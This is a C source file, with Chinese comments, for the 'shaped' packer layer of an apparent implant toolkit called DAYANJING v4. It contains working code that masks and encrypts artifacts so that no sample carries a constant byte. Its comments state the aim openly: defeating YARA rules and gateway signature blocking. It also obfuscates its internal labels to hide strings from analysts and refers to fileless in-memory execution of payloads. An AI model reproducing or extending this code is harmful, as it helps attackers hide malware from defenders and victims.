/*
 * DAYANJING v4 — 20_packer / shaped.c
 *
 * v4 多态头制品（shaped artifact）
 *
 * 要解决的问题
 * ------------
 * v2/v3 制品的前 12 字节恒为 magic(8) + version(4)，是一条跨制品可提取的
 * 静态签名；v3 还把 bind_id(32) 明文写入头（同一植入体上恒定）、epoch(4)
 * 明文写入头。于是任何拿到样本的人，即使完全解不开内容，也能判定
 * "这是 dayanjing 制品"，并据此写 YARA 规则、做网关特征拦截。
 *
 * v4 的做法
 * ---------
 * 把整个头用一次性掩码覆盖，掩码由会话种子与每制品随机的 nonce 共同派生：
 *
 *     blob = [ nonce(16, 明文随机) ][ masked_hdr(176) ][ ct ][ tag(16) ]
 *     mask = HKDF(seed, info = "…v4:mask" || nonce)
 *
 * 于是：
 *   - nonce 每制品随机 -> mask 每制品不同；
 *   - 头里的恒定字段（magic / version / bind_id / epoch）被每制品不同的掩码
 *     覆盖后在制品上表现为随机字节，不再具备跨制品恒定值；
 *   - 头里的随机字段（salt / iv / sha / eph_pub）本来就是随机的；
 *   - ct 是 AES-GCM 输出，本来就是随机的；tag 同理。
 *   结论：整份制品不存在任何跨样本恒定的字节。
 *
 * 识别方式的改变（这是本层的核心，不是副作用）
 * ------------------------------------------
 * v3 及以前：先比对 magic，再决定是否解密 —— 识别靠常量。
 * v4：没有任何可供比对的常量，唯一的识别途径是"能否用正确密钥解开"。
 *   即识别靠密钥，不靠常量。没有密钥的人连"这是 dayanjing 制品"都无法判定。
 *
 * 因此错误码一律收敛为 AUTH：magic 不符、版本不符、长度不自洽都不单独返回
 * MAGIC / VERSION / LEN。否则错误码本身就是一个 oracle——把一段未知字节喂
 * 进来，看返回 MAGIC 还是 AUTH，就能确认它是不是 dayanjing 制品、甚至能
 * 探出版本号。这类 oracle 与"识别靠常量"是同一个缺陷的两种形态。
 *
 * 与 poly.c 的分工（不要混用）
 * --------------------------
 *   poly.c   —— 面向位置无关机器码，产出"解密后就地跳转"的可执行存根。
 *   shaped.c —— 面向数据制品（ELF 文件、采集产物、配置），产出的是数据。
 * 给数据制品套 poly 存根是错的：存根解密后 jmp 到载荷，而 ELF 文件头不是
 * 可执行代码，跳过去只会 SIGSEGV。可执行载荷的无文件执行由 mexec.c
 * （memfd + execveat）承担，不落盘、不经 execve 路径。
 * 两层共享的是同一条原则与同一个验证方法：每份产出均无跨样本恒定字节。
 *
 * 不依赖 OpenSSL / zlib，仅 libc。
 */

#include "packer.h"
#include "pack_int.h"

#include <stdlib.h>
#include <string.h>

#include "crypto_gcm.h"
#include "crypto_hash.h"

/*
 * v4 头标识。恒以掩码形式出现，从不明文落盘，因此取值无需可打印——
 * 用不可打印字节可避免二进制里出现可读串（v1/v2/v3 的 "DJPAK" 是历史
 * 遗留，本层不再沿用）。同时与 v2/v3 的标识取值不同，杜绝跨版本误认。
 */
static const uint8_t V4_MAGIC[PK_MAGIC_LEN] = {
    0x9e, 0x2b, 0xc7, 0x51, 0xa4, 0x36, 0xf0, 0x1d
};

/* 掩码派生的 salt / info。与原可读串逐字节相同，异或存放以避免
   .rodata 中出现 "dayanjing:packer:*"（见 pack_int.h）。 */
static const uint8_t SHAPE_SALT_OBF[] = {
    PK_LB('d'), PK_LB('a'), PK_LB('y'), PK_LB('a'), PK_LB('n'),
    PK_LB('j'), PK_LB('i'), PK_LB('n'), PK_LB('g'), PK_LB(':'),
    PK_LB('p'), PK_LB('a'), PK_LB('c'), PK_LB('k'), PK_LB('e'),
    PK_LB('r'), PK_LB(':'), PK_LB('v'), PK_LB('4'), PK_LB(':'),
    PK_LB('s'), PK_LB('h'), PK_LB('a'), PK_LB('p'), PK_LB('e')
};
static const uint8_t SHAPE_INFO_OBF[] = {
    PK_LB('d'), PK_LB('a'), PK_LB('y'), PK_LB('a'), PK_LB('n'),
    PK_LB('j'), PK_LB('i'), PK_LB('n'), PK_LB('g'), PK_LB(':'),
    PK_LB('p'), PK_LB('a'), PK_LB('c'), PK_LB('k'), PK_LB('e'),
    PK_LB('r'), PK_LB(':'), PK_LB('v'), PK_LB('4'), PK_LB(':'),
    PK_LB('m'), PK_LB('a'), PK_LB('s'), PK_LB('k')
};
#define SHAPE_SALT_LEN (sizeof(SHAPE_SALT_OBF))
#define SHAPE_INFO_LEN (sizeof(SHAPE_INFO_OBF))

/* ---------- 掩码派生 ---------- */

/*
 * mask = HKDF-Expand(PRK, info = SHAPE_INFO || nonce, PK_HDR_V3_LEN)
 *  PRK  = HKDF-Extract(salt = SHAPE_SALT, ikm = seed)
 *
 * nonce 必须进 info：否则同一 seed 的所有制品共用同一掩码，头里的恒定字段
 * 只是被换成了另一组恒定值 —— 签名依然存在，只是换了个样子。
 */
static int pk_shape_mask(const uint8_t *seed, size_t seed_len,
                         const uint8_t nonce[PK_NONCE_LEN],
                         uint8_t mask[PK_HDR_V3_LEN])
{
    uint8_t prk[HKDF_HASH_LEN];
    uint8_t salt[SHAPE_SALT_LEN];
    uint8_t info[SHAPE_INFO_LEN + PK_NONCE_LEN];

    PK_LABEL_DEC(salt, SHAPE_SALT_OBF, SHAPE_SALT_LEN);
    if (hkdf_extract(salt, SHAPE_SALT_LEN, seed, seed_len, prk) != HASH_OK) {
        memset(salt, 0, sizeof(salt));
        return PK_ERR_ARG;
    }
    memset(salt, 0, sizeof(salt));

    PK_LABEL_DEC(info, SHAPE_INFO_OBF, SHAPE_INFO_LEN);
    memcpy(info + SHAPE_INFO_LEN, nonce, PK_NONCE_LEN);

    if (hkdf_expand(prk, info, sizeof(info), mask, PK_HDR_V3_LEN) != HASH_OK) {
        memset(prk, 0, sizeof(prk));
        return PK_ERR_ARG;
    }
    memset(prk, 0, sizeof(prk));
    memset(info, 0, sizeof(info));
    return PK_OK;
}

/* ---------- 头部编解码 ---------- */

/*
 * 从解掩码后的 176 字节还原头字段。
 * v4 的 tag 不放在头里（移到制品末尾），故 60..75 恒为零：
 * 若把 tag 留在头内，AAD 又要覆盖整个头，就会出现"tag 是加密产物、而 tag
 * 又被纳入 AAD"的循环依赖。移出即打破依赖。
 */
static int shaped_hdr_parse(const uint8_t *h, pk_hdr *out)
{
    /* SEC-CMP:PUBLIC: v4 制品头标识，位于【已掩码】的头内（整头经 HKDF 派生掩码）。这里是解掩码后的比对，明文不在制品上出现。 */
    if (memcmp(h, V4_MAGIC, PK_MAGIC_LEN) != 0) return PK_ERR_AUTH;

    out->version = get32(h + 8);
    if (out->version != PK_VERSION4) return PK_ERR_AUTH;

    out->flags   = get32(h + 12);
    out->raw_len = get64(h + 16);
    out->pay_len = get64(h + 24);

    memcpy(out->salt, h + 32, PK_SALT_LEN);
    memcpy(out->iv,   h + 48, PK_IV_LEN);
    memset(out->tag, 0, PK_TAG_LEN);          /* v4：tag 在末尾 */
    memcpy(out->raw_sha, h + 76, PK_SHA_LEN);
    memcpy(out->bind_id, h + 108, PK_BIND_ID_LEN);
    out->epoch = get32(h + 140);
    memcpy(out->eph_pub, h + 144, PK_EPH_PUB_LEN);

    return PK_OK;
}

/* AAD = nonce(16) || hdr(176)。nonce 直接取 blob 前 16 字节。 */
static void shaped_build_aad(const uint8_t *nonce, const uint8_t *hdr,
                             uint8_t *aad)
{
    memcpy(aad, nonce, PK_NONCE_LEN);
    memcpy(aad + PK_NONCE_LEN, hdr, PK_HDR_V3_LEN);
}

/*
 * 解出掩码后的头。不解密、不验签，仅派生掩码 —— 因此 epoch / bind_id 的
 * 查询仍是 O(1)，与 v3 的明文直读开销同量级。
 */
static int shaped_open(const uint8_t *blob, size_t blob_len,
                       const uint8_t *seed, size_t seed_len,
                       uint8_t hdr[PK_HDR_V3_LEN], pk_hdr *h)
{
    uint8_t mask[PK_HDR_V3_LEN];
    size_t  i;
    int     rc;

    if (!blob || !h) return PK_ERR_ARG;
    if (!seed || seed_len == 0) return PK_ERR_ARG;
    if (blob_len < PK_HDR_V4_LEN) return PK_ERR_SMALL;

    rc = pk_shape_mask(seed, seed_len, blob, mask);
    if (rc != PK_OK) return rc;

    for (i = 0; i < PK_HDR_V3_LEN; i++)
        hdr[i] = (uint8_t)(blob[PK_NONCE_LEN + i] ^ mask[i]);

    memset(mask, 0, sizeof(mask));
    return shaped_hdr_parse(hdr, h);
}

/* ====================================================================
 * 打包
 * ==================================================================== */

size_t pk_size_bound_v4(size_t raw_len)
{
    size_t comp_bound = (raw_len * 9u) / 8u + 2u + PK_LZSS_PREFIX;
    size_t body = (raw_len > comp_bound) ? raw_len : comp_bound;
    return PK_SHAPED_OVERHEAD + body;
}

int pk_pack_shaped(const uint8_t *raw, size_t raw_len,
                   const uint8_t *seed, size_t seed_len,
                   const uint8_t bind_id[PK_BIND_ID_LEN],
                   uint32_t epoch,
                   const uint8_t eph_pub[PK_EPH_PUB_LEN],
                   uint8_t *out, size_t *out_len)
{
    uint8_t *comp = NULL;
    size_t   comp_len = 0;
    size_t   comp_cap;
    size_t   body_len;
    const uint8_t *body;
    uint8_t  hdr[PK_HDR_V3_LEN];
    uint8_t  mask[PK_HDR_V3_LEN];
    uint8_t  aad[PK_AAD_V4_LEN];
    uint8_t  key[PK_KEY_LEN];
    uint8_t  sha[PK_SHA_LEN];
    size_t   i;
    int      rc;

    if (!raw || !out || !out_len) return PK_ERR_ARG;
    if (raw_len == 0) return PK_ERR_ARG;
    if (!seed || seed_len == 0) return PK_ERR_ARG;
    if (!bind_id || !eph_pub) return PK_ERR_ARG;

    if (*out_len < pk_size_bound_v4(raw_len)) return PK_ERR_NOMEM;

    /* --- 1. 压缩（仅在确有利时采用） --- */
    comp_cap = (raw_len * 9u) / 8u + 2u + PK_LZSS_PREFIX;
    comp = (uint8_t *)malloc(comp_cap ? comp_cap : 1u);
    if (!comp) return PK_ERR_NOMEM;

    comp_len = comp_cap;
    rc = pk_lzss_compress(raw, raw_len, comp, &comp_len);
    if (rc == PK_OK && comp_len < raw_len) {
        body = comp;
        body_len = comp_len;
    } else {
        body = raw;
        body_len = raw_len;
    }

    /* --- 2. nonce（每制品随机，掩码因之而变） --- */
    if (pk_rand(out, PK_NONCE_LEN) != PK_OK) { free(comp); return PK_ERR_SYS; }

    /* --- 3. 真实头（永不落盘，仅用于派生与 AAD） --- */
    memset(hdr, 0, sizeof(hdr));
    memcpy(hdr, V4_MAGIC, PK_MAGIC_LEN);
    put32(hdr + 8,  PK_VERSION4);
    put32(hdr + 12, (body == comp) ? PK_FLAG_COMPRESSED : 0u);
    put64(hdr + 16, (uint64_t)raw_len);
    put64(hdr + 24, (uint64_t)body_len);
    if (pk_rand(hdr + 32, PK_SALT_LEN) != PK_OK) { free(comp); return PK_ERR_SYS; }
    if (pk_rand(hdr + 48, PK_IV_LEN)   != PK_OK) { free(comp); return PK_ERR_SYS; }
    sha256(raw, raw_len, sha);
    memcpy(hdr + 76, sha, PK_SHA_LEN);
    memcpy(hdr + 108, bind_id, PK_BIND_ID_LEN);
    put32(hdr + 140, epoch);
    memcpy(hdr + 144, eph_pub, PK_EPH_PUB_LEN);

    /* --- 4. 掩码后写入 --- */
    rc = pk_shape_mask(seed, seed_len, out, mask);
    if (rc != PK_OK) { free(comp); return rc; }
    for (i = 0; i < PK_HDR_V3_LEN; i++)
        out[PK_NONCE_LEN + i] = (uint8_t)(hdr[i] ^ mask[i]);
    memset(mask, 0, sizeof(mask));

    /* --- 5. GCM 封装 --- */
    if (pk_derive_key(hdr + 32, PK_SALT_LEN, seed, seed_len, key) != PK_OK) {
        free(comp);
        return PK_ERR_ARG;
    }
    shaped_build_aad(out, hdr, aad);

    rc = gcm_seal(key, hdr + 48, aad, PK_AAD_V4_LEN,
                  body, body_len,
                  out + PK_HDR_V4_LEN,
                  out + PK_HDR_V4_LEN + body_len);
    memset(key, 0, sizeof(key));
    memset(hdr, 0, sizeof(hdr));
    free(comp);
    if (rc != GCM_OK) return PK_ERR_ARG;

    *out_len = PK_HDR_V4_LEN + body_len + PK_TAG_LEN;
    return PK_OK;
}

/* ====================================================================
 * 解包
 * ==================================================================== */

int pk_unpack_shaped(const uint8_t *blob, size_t blob_len,
                     const uint8_t *seed, size_t seed_len,
                     uint8_t *out, size_t *out_len)
{
    uint8_t  hdr[PK_HDR_V3_LEN];
    uint8_t  aad[PK_AAD_V4_LEN];
    uint8_t  key[PK_KEY_LEN];
    uint8_t  sha[PK_SHA_LEN];
    uint8_t *ctbuf = NULL;
    pk_hdr   h;
    size_t   cap;
    const uint8_t *ct;
    const uint8_t *tag;
    int      rc;

    if (!blob || !out || !out_len) return PK_ERR_ARG;
    if (!seed || seed_len == 0) return PK_ERR_ARG;

    cap = *out_len;
    if (blob_len < PK_SHAPED_OVERHEAD) return PK_ERR_SMALL;

    rc = shaped_open(blob, blob_len, seed, seed_len, hdr, &h);
    if (rc != PK_OK) return rc;                 /* 已收敛为 AUTH / SMALL */

    /* 长度自洽：密文 + tag 必须恰好填满剩余部分。不返回 LEN（避免 oracle）。 */
    if (h.pay_len != (uint64_t)(blob_len - PK_SHAPED_OVERHEAD))
        return PK_ERR_AUTH;
    if (h.raw_len == 0) return PK_ERR_AUTH;
    if (cap < h.raw_len) return PK_ERR_NOMEM;

    ct  = blob + PK_HDR_V4_LEN;
    tag = blob + PK_HDR_V4_LEN + (size_t)h.pay_len;

    if (pk_derive_key(h.salt, PK_SALT_LEN, seed, seed_len, key) != PK_OK)
        return PK_ERR_ARG;
    shaped_build_aad(blob, hdr, aad);

    ctbuf = (uint8_t *)malloc((size_t)h.pay_len);
    if (!ctbuf) { memset(key, 0, sizeof(key)); return PK_ERR_NOMEM; }

    rc = gcm_open(key, h.iv, aad, PK_AAD_V4_LEN,
                  ct, (size_t)h.pay_len, tag, ctbuf);
    memset(key, 0, sizeof(key));
    memset(hdr, 0, sizeof(hdr));
    if (rc == GCM_ERR_AUTH) { free(ctbuf); return PK_ERR_AUTH; }
    if (rc != GCM_OK) { free(ctbuf); return PK_ERR_ARG; }

    if (h.flags & PK_FLAG_COMPRESSED) {
        size_t dlen = (size_t)h.raw_len;
        rc = pk_lzss_decompress(ctbuf, (size_t)h.pay_len, out, &dlen);
        free(ctbuf);
        if (rc != PK_OK) return PK_ERR_AUTH;    /* 解压失败也不单独暴露 */
        if (dlen != (size_t)h.raw_len) return PK_ERR_AUTH;
        *out_len = dlen;
    } else {
        if ((size_t)h.pay_len != (size_t)h.raw_len) {
            free(ctbuf);
            return PK_ERR_AUTH;
        }
        memcpy(out, ctbuf, (size_t)h.raw_len);
        free(ctbuf);
        *out_len = (size_t)h.raw_len;
    }

    /* 明文摘要比对：即便密钥正确、内容被替换也能发现 */
    sha256(out, *out_len, sha);
    if (crypto_constant_time_eq(sha, h.raw_sha, PK_SHA_LEN) == 0)
        return PK_ERR_HASH;

    return PK_OK;
}

/* ====================================================================
 * O(1) 查询（只需派生掩码，不需解密）
 * ==================================================================== */

int pk_shaped_epoch(const uint8_t *blob, size_t blob_len,
                    const uint8_t *seed, size_t seed_len,
                    uint32_t *epoch)
{
    uint8_t hdr[PK_HDR_V3_LEN];
    pk_hdr  h;
    int     rc;

    if (!epoch) return PK_ERR_ARG;
    *epoch = 0;

    rc = shaped_open(blob, blob_len, seed, seed_len, hdr, &h);
    memset(hdr, 0, sizeof(hdr));
    if (rc != PK_OK) return rc;

    *epoch = h.epoch;
    return PK_OK;
}

int pk_shaped_bind_id(const uint8_t *blob, size_t blob_len,
                      const uint8_t *seed, size_t seed_len,
                      uint8_t id[PK_BIND_ID_LEN])
{
    uint8_t hdr[PK_HDR_V3_LEN];
    pk_hdr  h;
    int     rc;

    if (!id) return PK_ERR_ARG;

    rc = shaped_open(blob, blob_len, seed, seed_len, hdr, &h);
    memset(hdr, 0, sizeof(hdr));
    if (rc != PK_OK) return rc;

    memcpy(id, h.bind_id, PK_BIND_ID_LEN);
    return PK_OK;
}
